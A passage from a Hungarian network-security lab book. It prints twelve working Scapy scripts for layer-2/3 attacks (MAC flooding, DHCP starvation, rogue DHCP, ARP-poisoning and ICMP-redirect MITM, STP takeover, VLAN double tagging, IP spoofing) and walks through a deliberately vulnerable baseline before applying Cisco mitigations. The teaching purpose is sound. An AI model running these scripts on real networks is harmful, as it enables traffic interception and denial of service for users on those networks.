## 18\. `verify.py` — automatizált ellenőrzés

Ez a szkript **már a repó gyökerében van** (`verify.py`) — nem kell létrehoznod. 27 ellenőrzést futtat, és megnézi, hogy minden védelmi beállítás a helyén van-e. **Nem ad jegyet és nem pontoz** — csak felsorolja, melyik ellenőrzés ment át (Pipa) és melyik nem (Hiba). Futtatása (a részletek a 24. fejezetben):

```bash
python3 verify.py inventory.yml              # ellenőrzés
python3 verify.py inventory.yml --verbose    # nyers show-kimenetekkel (hibakereséshez)
python3 verify.py inventory.yml --json eredmeny.json   # gépi kiértékeléshez
python3 verify.py inventory.yml --only S1    # csak egy eszköz
```

## 19\. A 12 támadó szkript (`attacker/`)

Mind a 12 szkript **már a repóban van** az `attacker/` mappában — nem kell létrehoznod. Mindegyik a **támadó gépen (ATTACKER)**, **root joggal** fut, és a fejlécében (docstring) ott a pontos futtatási parancs is. (A tartalmuk referenciaként itt is megvan.)

### 19.1 `mac_flood.py` — MAC address table overflow (1. fázis)

Mire használod: véletlen forrás-MAC-okkal elárasztja a switch MAC-tábláját, ami egy idő után hub-módba vált.

```python
#!/usr/bin/env python3
"""MAC flooding: véletlen forrás-MAC-okkal tölti a CAM-táblát.
A switch egy idő után hub-módba vált, és minden keretet minden portra másol.

Futtatás: sudo python3 mac_flood.py eth0 10000
"""
import random, sys
from scapy.all import Ether, IP, UDP, sendp, conf

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.getrandbits(8) for _ in range(5))

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
    conf.iface = iface
    print(f"[*] MAC flood indul: {count} keret a(z) {iface}-n...")
    for i in range(count):
        sendp(Ether(src=rand_mac(), dst="ff:ff:ff:ff:ff:ff") /
              IP(src="10.10.10.66", dst="10.10.10.1") / UDP(), verbose=0)
        if i % 1000 == 0:
            print(f"[+] elküldve: {i}")
    print("[!] Kész. Nézd: 'show mac address-table count' a switchen.")

if __name__ == "__main__":
    main()
```

### 19.2 `mac_spoof.py` — MAC spoofing (2. fázis)

Mire használod: a legit áldozat MAC-címét veszi fel, hogy a sticky port-security violationt váltson ki.

```python
#!/usr/bin/env python3
"""A legit áldozat MAC-címét veszi fel a támadó — a port security
sticky-listája miatt violation lép fel.

Futtatás: sudo python3 mac_spoof.py eth0 00:50:56:AA:BB:01
"""
import sys, time
from scapy.all import Ether, ARP, sendp, conf

def main():
    iface, victim_mac = sys.argv[1], sys.argv[2]
    conf.iface = iface
    frame = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / \
            ARP(op=1, hwsrc=victim_mac, psrc="10.10.10.77", pdst="10.10.10.1")
    print(f"[*] ARP Request a spoofolt MAC-címmel ({victim_mac})...")
    for _ in range(20):
        sendp(frame, verbose=0)
        time.sleep(0.5)
    print("[!] Kész. Ellenőrizd: 'show port-security' + syslog.")

if __name__ == "__main__":
    main()
```

### 19.3 `dhcp_starve.py` — DHCP starvation (3. fázis)

Mire használod: egyedi ügyfél-MAC-okkal küldött DISCOVER-ekkel kimeríti a DHCP-poolt.

```python
#!/usr/bin/env python3
"""Kimeríti a DHCP-poolt egyedi ügyfél-MAC-okkal küldött DISCOVER-ekkel.

Futtatás: sudo python3 dhcp_starve.py eth0 250
"""
import random, struct, sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 250
    conf.iface = iface
    real_mac = conf.iface.mac
    print(f"[*] {n} DHCPDISCOVER különböző ügyfél-MAC-okkal...")
    for i in range(n):
        chaddr = (bytes.fromhex(real_mac.replace(":", "")) +
                  struct.pack(">IH", i, 0)).ljust(16, b"\x00")[:16]
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=real_mac) /
              IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
              BOOTP(chaddr=chaddr, xid=random.randint(1, 2**32 - 1), flags=0x8000) /
              DHCP(options=[("message-type", "discover"),
                            ("param_req_list", [1, 3, 6, 15, 51]), "end"]),
              verbose=0)
        if i % 25 == 0:
            print(f"[+] {i} DISCOVER elküldve")
    print("[!] Kész. Nézd: 'show ip dhcp binding' az R1-en.")

if __name__ == "__main__":
    main()
```

### 19.4 `rogue_dhcp.py` — DHCP spoofing (4. fázis)

Mire használod: hamis DHCP-szerver, amely az OFFER-ben a támadót adja gateway-nek és DNS-nek.

```python
#!/usr/bin/env python3
"""Hamis DHCP-szerver: az OFFER-ben a támadót adja gateway-nek és DNS-nek.
DHCP Snooping után ezek az üzenetek eldobódnak az untrusted porton.

Futtatás: sudo python3 rogue_dhcp.py eth0
"""
import sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf

ROGUE_IP = "10.10.10.254"
POOL = [f"10.10.10.{i}" for i in range(100, 200)]
assigned = {}

def handle_discover(pkt):
    if pkt[UDP].dport == 67 and DHCP in pkt:
        opts = dict(x for x in pkt[DHCP].options if isinstance(x, tuple))
        if opts.get("message-type") != 1:        # csak DISCOVER
            return
        cli_mac = pkt[Ether].src
        offer_ip = assigned.setdefault(cli_mac, POOL[len(assigned) % len(POOL)])
        resp = (Ether(src=conf.iface.mac, dst=cli_mac) /
                IP(src=ROGUE_IP, dst=offer_ip) / UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offer_ip, siaddr=ROGUE_IP,
                      chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                DHCP(options=[("message-type", 2), ("server_id", ROGUE_IP),
                              ("subnet_mask", "255.255.255.0"),
                              ("router", ROGUE_IP),          # <-- mi vagyunk a GW
                              ("name_server", ROGUE_IP),
                              ("lease_time", 3600), "end"]))
        sendp(resp, verbose=0)
        print(f"[+] OFFER küldve {cli_mac} -> {offer_ip} gw={ROGUE_IP}")

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] Rogue DHCP figyel a(z) {iface}-n. Ctrl+C a leállításhoz.")
    sniff(iface=iface, filter="udp and (port 67 or 68)", prn=handle_discover, store=0)

if __name__ == "__main__":
    main()
```

### 19.5 `arp_spoof.py` — ARP poisoning / kétirányú MITM (5. fázis)

Mire használod: az áldozat és a gateway felé is a saját MAC-címét hazudja → a kétirányú forgalom rajta megy át.

```python
#!/usr/bin/env python3
"""Kétirányú ARP poisoning: az áldozat és a gateway felé is azt hazudjuk,
hogy a másik MAC-címe a miénk. Így a kétirányú forgalom rajtunk át megy (MITM).

Futtatás: sudo python3 arp_spoof.py eth0 10.10.10.20 10.10.10.1
"""
import sys, time
from scapy.all import ARP, send, get_if_hwaddr, arping, conf

def get_mac(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=0)
    return ans[0][1].src

def main():
    iface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    conf.iface = iface
    vmac, gmac = get_mac(victim, iface), get_mac(gateway, iface)
    print(f"[*] áldozat {victim} @ {vmac} | gw {gateway} @ {gmac}")
    try:
        while True:
            send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=vmac), verbose=0)
            send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gmac), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Takarítás: eredeti ARP-k visszaállítása...")
        send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=vmac, hwsrc=gmac), count=3, verbose=0)
        send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gmac, hwsrc=vmac), count=3, verbose=0)

if __name__ == "__main__":
    main()
```

### 19.6 `stp_takeover.py` — STP manipuláció (6. fázis)

Mire használod: 0 prioritású (superior) BPDU-kat küld, hogy a támadó legyen a root bridge.

```python
#!/usr/bin/env python3
"""0 prioritású BPDU-k küldése — a támadó igyekszik root bridge-gé válni.
A BPDU Guard emiatt err-disabled állapotba teszi a portot.

Futtatás: sudo python3 stp_takeover.py eth0
Alternatíva (megbízhatóbb): sudo brctl addbr br0 && sudo brctl setbridgeprio br0 0
                            && sudo ip link set br0 up
"""
import sys, time
from scapy.all import Ether, sendp, conf

LLC = b"\x42\x42\x03"   # 802.2 LLC: DSAP/SSAP=STP, control=UI

def stp_config_bpdu(root_id, bridge_id):
    return (b"\x00\x00\x00\x00"                     # proto id, verzió, típus, flag-ek
            + root_id + b"\x00\x00"                 # root id, path cost
            + bridge_id + b"\x80\x01"               # bridge id, port id
            + b"\x14\x00\x14\x00\x04\x00\x0a\x00")  # age-ek / forward delay

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    att_mac = conf.iface.mac
    bid = b"\x00\x00" + bytes.fromhex(att_mac.replace(":", ""))
    frame = Ether(dst="01:80:c2:00:00:00", src=att_mac) / (LLC + stp_config_bpdu(bid, bid))
    print("[*] Rogue superior BPDU-k küldése (priority 0)... Ctrl+C a leállításhoz.")
    try:
        while True:
            sendp(frame, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Leállítva. Nézd: 'show spanning-tree root' + syslog.")

if __name__ == "__main__":
    main()
```

### 19.7 `vlan_hop_recon.py` — DTP/VLAN hopping felderítés (7. fázis)

Mire használod: DTP- és 802.1Q-kereteket figyel; ha lát DTP-t, a port trunkolható.

```python
#!/usr/bin/env python3
"""DTP-keretek figyelése: ha a port 'dynamic' módban van, trunkolható.

Futtatás: sudo python3 vlan_hop_recon.py eth0
"""
import sys
from scapy.all import sniff, Ether

def show(pkt):
    if Ether in pkt:
        etype = pkt[Ether].type
        if etype == 0x2004:
            print("[!] DTP-keret látva — a port valószínűleg dynamic módban van!")
            print(pkt.summary())
        elif etype == 0x8100:
            print("[!] Tagged 802.1Q-forgalom érkezik az access porton:")
            print(pkt.summary())

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] DTP- és 802.1Q-megfigyelés a(z) {iface}-n...")
    sniff(iface=iface, prn=show, store=0,
          filter="ether proto 0x2004 or ether proto 0x8100")

if __name__ == "__main__":
    main()
```

### 19.8 `cdp_telnet_recon.py` — CDP lehallgatás + Telnet-próba (8. fázis)

Mire használod: passzívan gyűjti a CDP-infót (platform, port, IOS-verzió) és megpróbál Telnettel csatlakozni.

```python
#!/usr/bin/env python3
"""CDP-üzenetek passzív lehallgatása (platform, port, IOS-verzió) + Telnet-próba.

Futtatás: sudo python3 cdp_telnet_recon.py eth0 10.0.99.1
"""
import socket, sys
from scapy.all import sniff, Ether

def parse_cdp(pkt):
    print(f"[+] CDP-keret: {pkt.src} -> {pkt.dst}, {len(pkt)} bájt")
    print(pkt.summary())

def telnet_probe(ip):
    print(f"[*] Telnet-próba: {ip}:23 ...")
    try:
        s = socket.create_connection((ip, 23), timeout=3)
        print(f"[!] NYITOTT TELNET: {s.recv(100)!r}")
        s.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("[+] Telnet zárva/elutasítva — jó.")

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    mgmt_ip = sys.argv[2] if len(sys.argv) > 2 else None
    if mgmt_ip:
        telnet_probe(mgmt_ip)
    print(f"[*] CDP-figyelés a(z) {iface}-n (30 mp)...")
    sniff(iface=iface, lfilter=lambda p: Ether in p and p[Ether].type == 0x2000,
          prn=parse_cdp, store=0, timeout=30)

if __name__ == "__main__":
    main()
```

### 19.9 `vlan_double_tag.py` — 802.1Q double-tagging (9. fázis)

Mire használod: dupla VLAN-címkével keretet juttat a VLAN 20-ba (a PC-W felé). Egyirányú támadás.

```python
#!/usr/bin/env python3
"""Külső tag = a trunk natív VLAN-ja (a trunkon lecsúszik), belső tag = cél-VLAN.
A második switch a BELSŐ taget értelmezi → a keret bejut a másik VLAN-ba.
Egyirányú támadás: a válasz nem tud visszajutni.

Futtatás: sudo python3 vlan_double_tag.py eth0 10.20.20.10 [outer] [inner]
"""
import sys
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    target = sys.argv[2] if len(sys.argv) > 2 else "10.20.20.10"
    outer = int(sys.argv[3]) if len(sys.argv) > 3 else 1     # trunk natív VLAN-ja
    inner = int(sys.argv[4]) if len(sys.argv) > 4 else 20    # áldozat VLAN-ja
    conf.iface = iface
    frame = (Ether(dst="aa:aa:aa:aa:aa:aa", src=conf.iface.mac) /
             Dot1Q(vlan=outer) / Dot1Q(vlan=inner) /
             IP(src="10.10.10.66", dst=target) / ICMP(type=8, id=0x1234))
    print(f"[*] Double-tagged keretek: outer={outer}, inner={inner}, dst={target}")
    print("[*] Figyeld a PC-W-t (VLAN 20) tcpdumppal az ICMP echo request-et.")
    for _ in range(10):
        sendp(frame, verbose=0)
    print("[!] Kész. Az S2-n a 'show interfaces trunk' megmutatja a natív VLAN-t.")

if __name__ == "__main__":
    main()
```

### 19.10 `ip_spoof.py` — IP spoofing (10. fázis)

Mire használod: hamis forrás-IP-jű csomagot küld; ezt csak az IP Source Guard fogja meg (a DHCP snooping önmagában nem).

```python
#!/usr/bin/env python3
"""Hamis forrás-IP-jű csomagok injektálása.
Fontos: a keret a támadó VALÓDI MAC-jét hordozza, de hamis forrás-IP-t —
a DHCP Snooping önmagában nem fogja meg, csak az IP Source Guard.

Futtatás: sudo python3 ip_spoof.py eth0 10.10.10.50 [dst]
"""
import sys, time
from scapy.all import Ether, IP, UDP, sendp, conf

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    spoofed = sys.argv[2] if len(sys.argv) > 2 else "10.10.10.50"
    dst = sys.argv[3] if len(sys.argv) > 3 else "10.10.10.1"
    conf.iface = iface
    pkt = (Ether(src=conf.iface.mac, dst="ff:ff:ff:ff:ff:ff") /
           IP(src=spoofed, dst=dst, ttl=64) / UDP(sport=44444, dport=53))
    print(f"[*] Spoofolt csomagok: forrás-IP={spoofed}, valós MAC={conf.iface.mac}")
    for _ in range(10):
        sendp(pkt, verbose=0)
        time.sleep(0.2)
    print(f"[!] 10 csomag elküldve. Nézd: 'show ip verify source' — a DHCP snooping "
          f"binding-táblában NEM szerepelhet a {spoofed} cím.")

if __name__ == "__main__":
    main()
```

### 19.11 `lldp_recon.py` — LLDP felderítés + hamis LLDPDU (11. fázis)

Mire használod: LLDPDU-kat gyűjt (rendszernév, port, menedzsment-IP), és opcionálisan hamis LLDP-bejegyzést injektál.

```python
#!/usr/bin/env python3
"""LLDPDU-k passzív gyűjtése (rendszernév, port, képességek, menedzsment-IP),
plusz opcionálisan HAMIS LLDP-bejegyzés injektálása.
LLDP: IEEE-szabvány, ethertype 0x88CC, multicast 01:80:c2:00:00:0e.

Futtatás: sudo python3 lldp_recon.py eth0 [--inject]
"""
import sys
from scapy.all import sniff, Ether, sendp, conf

LLDP_DST, LLDP_ETHTYPE = "01:80:c2:00:00:0e", 0x88CC

def build_fake_lldp(our_mac):
    chassis = b"\x02\x07\x04" + bytes.fromhex(our_mac.replace(":", ""))
    port = b"\x04\x05\x03\x00\x12\x46\x61\x30\x2f\x38"
    ttl = b"\x06\x02\x00\x78"
    return chassis + port + ttl + b"\x00"

def show_lldp(pkt):
    print(f"[+] LLDPDU látva: {pkt.src}, {len(pkt)} bájt")
    print("    Payload (első 64 bájt):", bytes(pkt)[:64].hex())

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    if "--inject" in sys.argv:
        frame = Ether(dst=LLDP_DST, src=conf.iface.mac, type=LLDP_ETHTYPE) / \
                build_fake_lldp(conf.iface.mac)
        print(f"[*] Hamis LLDPDU injektálása (chassis = {conf.iface.mac})...")
        for _ in range(5):
            sendp(frame, verbose=0)
    print(f"[*] LLDP-figyelés a(z) {iface}-n 30 mp-ig...")
    sniff(iface=iface, lfilter=lambda p: Ether in p and p[Ether].type == LLDP_ETHTYPE,
          prn=show_lldp, store=0, timeout=30)

if __name__ == "__main__":
    main()
```

### 19.12 `icmp_redirect.py` — Gateway MITM ICMP redirecten át (12. fázis)

Mire használod: az áldozatnak azt hazudja, hogy a gateway a támadón át érhető el.

```python
#!/usr/bin/env python3
"""Gateway MITM ICMP Redirect-del: az áldozatnak azt hazudjuk, hogy a gateway
a támadón át érhető el egy adott cél felé.

Futtatás: sudo python3 icmp_redirect.py eth0 <victim_ip> <gateway_ip> [prefix]
Megjegyzés: a demonstrációhoz az áldozat VM-en engedélyezni kell:
  sysctl -w net.ipv4.conf.eth0.accept_redirects=1
(a modern alapértelmezés tiltja — ez maga is tanulság!)
"""
import sys, time
from scapy.all import Ether, IP, ICMP, sendp, conf, arping, get_if_hwaddr

def resolve(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=0)
    return ans[0][1].src

def main():
    iface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    prefix = sys.argv[4] if len(sys.argv) > 4 else "0.0.0.0/0"
    conf.iface = iface
    vmac = resolve(victim, iface)
    att_ip = getattr(conf.iface, "ip", None) or "10.10.10.66"
    target_ip = prefix.split("/")[0]
    pkt = (Ether(src=get_if_hwaddr(iface), dst=vmac) /
           IP(src=gateway, dst=victim) /              # "a gateway-től"
           ICMP(type=5, code=1, gw=att_ip) /          # redirect host, a támadón át
           IP(src=victim, dst=target_ip))
    print(f"[*] ICMP redirectek: {victim} felé, a gateway-nek kiadva magunkat ({gateway})...")
    try:
        for _ in range(20):
            sendp(pkt, verbose=0)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    print("[!] A PC-V-n az 'ip route' parancs mutatja a redirect-től telepített route-ot.")

if __name__ == "__main__":
    main()
```

---

# IV. RÉSZ — A labor végigjátszása lépésről lépésre

Innentől a könyv feltételezi, hogy a II. és III. rész készen van: a venv aktív (a parancssor elején ott a `(.venv)`), a csomagok telepítve, és a fájlok (`inventory.yml`, `configs/`, `push_config.py`, `verify.py`, `attacker/`) a helyükön vannak.

> **A labor ritmusa minden fázisban ugyanaz — jegyezd meg:**\
> **(1) Támadás futtatása** → **(2) Megfigyelés** (mit okozott) → **(3) Védelem feltöltése** → **(4) Újratámadás** (most már elhiúsul).

## 20\. Előkészítés: az eszközök elérhetővé tétele

A `push_config.py` **SSH-n** jelentkezik be az eszközökre (netmiko), ezért S1, S2 és R1 már az **első feltöltés előtt** elérhető kell legyen a menedzsment-VLAN-on (VLAN 99).

**20.1 — Egyszeri kézi alapbeállítás az eszköz konzoljáról.** Ezt a switch/router fizikai (vagy emulátoros) konzolján gépeled be, nem a PC-A-n. Switchenként/routerenként egyszer kell:

```
enable
configure terminal
hostname S1
ip domain-name lab.local
username admin privilege 15 secret cisco123
crypto key generate rsa modulus 2048
interface vlan 99
 ip address 10.0.99.1 255.255.255.0
 no shutdown
exit
line vty 0 4
 login local
 transport input telnet ssh
end
write memory
```

> A `username`/`secret` (`admin` / `cisco123`) egyeznie kell az `inventory.yml`-ben megadottal. **A `cisco123` csak példajelszó — éles eszközön cseréld le, és az `inventory.yml`-ben is írd át.**

**20.2 — Elérhetőség ellenőrzése a PC-A-ról.** A PC-A terminálján (aktív venv-vel):

```bash
ping 10.0.99.1
ping 10.0.99.2
ping 10.0.99.254
```

Ha mindhárom válaszol, mehet a feltöltés. Ha nem: lásd a 27. hibakeresési gyorslistát.

## 21\. 0. lépés — a sebezhető baseline feltöltése

A baseline a **védtelen kiinduló állapot**: minden védelem KI, az eszközök elérhetők, és a vty-sorokon a Telnet is nyitva (hogy a 8. fázis demózható legyen). Töltsd fel:

```bash
python3 push_config.py inventory.yml configs/baseline.yml
```

**Elvárt eredmény:** S1, S2, R1 elérhető SSH-n ÉS Telneten, egyetlen védelem sincs aktív. Gyors ellenőrzés:

```bash
ssh admin@10.0.99.1
```

majd az eszközön:

```
show running-config | section line vty
```

A kimenetben szerepelnie kell: `transport input telnet ssh`. Ezzel a labor **készen áll** — jöhet a 12 fázis.

## 22\. 1–12. fázis — támadás → megfigyelés → védelem → újratámadás

**Két külön terminál kell:**

* **ATTACKER terminál** — a támadó gépen, a támadó szkriptekhez. Ezek raw socketet használnak, ezért **root** kell (`sudo`). Az interfész itt `eth0` (ha nálad más, írd át).

* **PC-A terminál** — az admin gépen, aktív venv-vel, a védelmek feltöltéséhez (`push_config.py`).

* **PC-V / PC-W terminál** — az áldozat/megfigyelő gépen a hatás nézéséhez (`tcpdump`).

> **`sudo` és a venv (fontos a támadó szkripteknél!):** a `sudo` alapból kilép a venv-ből, így a `sudo python3 ...` a rendszer Pythonját futtatná, amelyben nincs scapy. Két megoldás:
>
> 1. telepítsd a scapy-t rendszerszinten is a támadó gépen: `sudo pip install scapy`, VAGY
>
> 2. add meg a venv Pythonjának teljes útját, pl.:
>
>   ```bash
>   sudo .venv/bin/python3 attacker/mac_flood.py eth0 10000
>   ```
>
> Az alábbi parancsok az egyszerűség kedvéért `sudo python3 ...` alakban szerepelnek — ha „ModuleNotFoundError: scapy" hibát kapsz, használd a fenti 2. megoldást.

> **Megfigyelés a PC-V/PC-W-n — Linux vagy Windows, ahogy neked kényelmes.** A támadás előtt, külön ablakban indítsd el a csomagfigyelőt:
>
> * **Linuxon (tcpdump):**
>   ```bash
>   sudo tcpdump -i eth0 -n
>   ```
> * **Windowson (Wireshark):** indítsd el a **Wireshark**-ot → a felső listában **dupla kattintás a hálózati interfészre** (amelyik a laborhálózatra néz) → a rögzítés elindul. A felső **szűrő (Display filter)** mezőbe írhatsz szűrőt, pl. `arp`, `icmp`, `bootp` (DHCP), majd Enter. Parancssorból a Wireshark `tshark` eszközével ugyanez: `tshark -i <interfész>`.
>
> A könyv a megfigyelési lépéseket `tcpdump`-pal írja le; a megfelelő **Wireshark-szűrőt** fázisonként külön megadjuk. A támadó szkriptek ettől függetlenül továbbra is a **Linux ATTACKER** gépen futnak (a scapy miatt).

---

### 1\. fázis — MAC flood (CAM overflow) → Port Security

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/mac_flood.py eth0 10000
```

**(2) Megfigyelés:** a switch CAM-táblája megtelik, a switch elkezd mindenkinek mindent továbbítani → a PC-V-n idegen (nem neki címzett) forgalom jelenik meg. Linuxon `tcpdump -i eth0 -n`, Windowson Wireshark — szűrő nélkül (vagy `not arp` a zaj szűrésére) látszik a sok idegen keret.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml port-security
```

**(4) Újratámadás:** futtasd újra az 1. lépés parancsát. Most a Fa0/3 `violation shutdown` miatt **err-disabled** állapotba kerül (Fa0/1-en `restrict` + sticky), a CAM nem telik meg.

> **Fontos:** a következő fázis előtt hozd vissza a Fa0/3-at (lásd a 23. fejezet err-disabled visszaállítását).

---

### 2\. fázis — MAC spoofing → Port Security (sticky)

Előbb jegyezd fel a PC-V MAC-címét (a PC-V-n: `ip link show eth0`), és írd a `<PC-V-MAC>` helyére.

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/mac_spoof.py eth0 <PC-V-MAC>
```

**(2) Megfigyelés:** az S1 syslogjában `port-security violation` üzenet.\
**(3) Védelem:** már aktív az 1. fázisból (sticky port security).\
**(4) Újratámadás:** a port lezár / a violation jelez. A továbblépés előtt szükség esetén állítsd vissza a portot.

---

### 3\. fázis — DHCP starvation → DHCP Snooping

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/dhcp_starve.py eth0 250
```

**(2) Megfigyelés:** az R1-en sok hamis DHCP-binding keletkezik, a PC-V **nem kap IP-címet**.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml dhcp-snooping
```

**(4) Újratámadás:** az untrusted porton rate-limit lép életbe, a hamis DHCP-üzeneteket a switch eldobja.

---

### 4\. fázis — Rogue DHCP (DHCP spoofing) → DHCP Snooping (trust)

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/rogue_dhcp.py eth0
```

majd a PC-V-n kérj új címet (DHCP renew):

```bash
# Linux:
sudo dhclient -r eth0 && sudo dhclient eth0
```
```bat
REM Windows (parancssor, rendszergazdaként):
ipconfig /release
ipconfig /renew
```

**(2) Megfigyelés:** a PC-V gatewaye a támadó lesz (`10.10.10.254` helyett a hamis szerver). Ellenőrzés a PC-V-n: Linuxon `ip route`, **Windowson `ipconfig`** (nézd az „Alapértelmezett átjáró / Default Gateway" sort). Wireshark-szűrő a DHCP-forgalomra: `bootp`.\
**(3) Védelem:** a `dhcp-snooping` már aktív a 3. fázisból (a trust-beállítás a routeri/uplink portra).\
**(4) Újratámadás:** a PC-V már csak legitim lease-t kap, helyes gatewayjel.

---

### 5\. fázis — ARP poisoning (MITM) → Dynamic ARP Inspection (DAI)

Előbb derítsd ki a PC-V IP-jét (`<PC-V-IP>`), a gateway `10.10.10.1`.

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/arp_spoof.py eth0 <PC-V-IP> 10.10.10.1
```

**(2) Megfigyelés:** a PC-V-n az `arp -a` parancs (Linuxon és Windowson is ugyanez) — a gateway MAC-címe a **támadó** MAC-címe lett → a forgalom a támadón megy át. Wireshark-szűrő: `arp` (látod a hamis ARP-válaszokat).\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml dai
```

**(4) Újratámadás:** a DAI-statisztikában nő a `dropped`, az ARP-tábla **nem** változik.

---

### 6\. fázis — STP root takeover → BPDU Guard + Root Guard

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/stp_takeover.py eth0
```

**(2) Megfigyelés:** védelem nélkül az eszközön `show spanning-tree root` szerint a **támadó** lett a root bridge → átfolyik rajta a forgalom.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml stp-guard
```

**(4) Újratámadás:** a Fa0/3 err-disabled lesz, a syslog jelez.

> A következő fázis előtt hozd vissza a Fa0/3-at (23. fejezet).

---

### 7\. fázis — VLAN hopping (DTP) → DTP tiltása, fix access portok

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/vlan_hop_recon.py eth0
```

**(2) Megfigyelés:** védelem nélkül DTP-keret látszik, a port trunkká alakítható.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml vlan-hop
```

**(4) Újratámadás:** nincs DTP, a portok fix access módban vannak, a nem használt portok lezárva.

---

### 8\. fázis — CDP recon + nyílt Telnet → Switch hardening

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/cdp_telnet_recon.py eth0 10.0.99.1
```

**(2) Megfigyelés:** a CDP-ben látszik az IOS-verzió, és a Telnet nyitva van (titkosítatlan bejelentkezés).\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml hardening
```

**(4) Újratámadás:** nincs CDP, csak SSHv2, a Telnet elutasítva.

---

### 9\. fázis — 802.1Q double-tagging → natív VLAN hardening + pruning

Ehhez a fázishoz kell a **PC-W** (VLAN 20) az S2 Fa0/1-en. Indíts rajta csomagfigyelőt az ICMP-re:

```bash
# Linux:
sudo tcpdump -i eth0 -n icmp
```
Windowson a **Wireshark**-ban a **Display filter** mezőbe írd: `icmp`.

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/vlan_double_tag.py eth0 10.20.20.10
```

**(2) Megfigyelés:** a PC-W (VLAN 20) **ICMP-t kap** a VLAN 10-es támadótól — a dupla címke átvitte a keretet a másik VLAN-ba.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml native-vlan-hardening
```

**(4) Újratámadás:** futtasd **újra** a double-tagging támadást — most a keret **nem** jut el a VLAN 20-ba.

---

### 10\. fázis — IP spoofing → IP Source Guard

> **KRITIKUS SORREND:** az `ip-source-guard` csak a `dhcp-snooping` UTÁN tölthető fel (lásd 3. fázis). Ha ezt kihagynád, minden user-forgalom elesik. Lásd a 23. fejezetet.

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/ip_spoof.py eth0 10.10.10.50
```

**(2) Megfigyelés:** védelem nélkül a hamis forrás-IP látszik a dróton. Linuxon `tcpdump -i eth0 -n`, Windowson Wireshark — a forrás-IP oszlopban feltűnik a hamisított cím (szűrő: `ip.src == <hamis-IP>`).\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml ip-source-guard
```

**(4) Újratámadás:** a kereteket a hardver eldobja; ellenőrzés az eszközön: `show ip verify source`.

---

### 11\. fázis — LLDP recon → LLDP tiltása user-portokon

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/lldp_recon.py eth0 --inject
```

**(2) Megfigyelés:** LLDPDU-k láthatók (rendszernév, portok), és hamis LLDPDU injektálható.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml lldp-hardening
```

**(4) Újratámadás:** a user-portokon nincs LLDP TX/RX.

> **Platformfüggő:** egyes IOS-buildeken csak globális `no lldp run` létezik portszintű parancs helyett. Első alkalommal teszteld a saját IOS-odon.

---

### 12\. fázis — ICMP redirect (gateway MITM) → `no ip redirects` a routeren

> **Előfeltétel a PC-V-n:** a modern Linux alapból tiltja a redirecteket (épp ez a tanulság!). A demóhoz a PC-V-n ideiglenesen engedélyezd:
>
> ```bash
> sudo sysctl -w net.ipv4.conf.all.accept_redirects=1
> sudo sysctl -w net.ipv4.conf.eth0.accept_redirects=1
> ```

**(1) Támadás** (ATTACKER):

```bash
sudo python3 attacker/icmp_redirect.py eth0 <PC-V-IP> 10.10.10.1
```

**(2) Megfigyelés:** a PC-V route-táblája a támadón át vezet — ellenőrzés a PC-V-n: `ip route`.\
**(3) Védelem** (PC-A):

```bash
python3 push_config.py inventory.yml configs/mitigations.yml icmp-redirect
```

**(4) Újratámadás:** a router többé sosem küld ICMP redirectet.

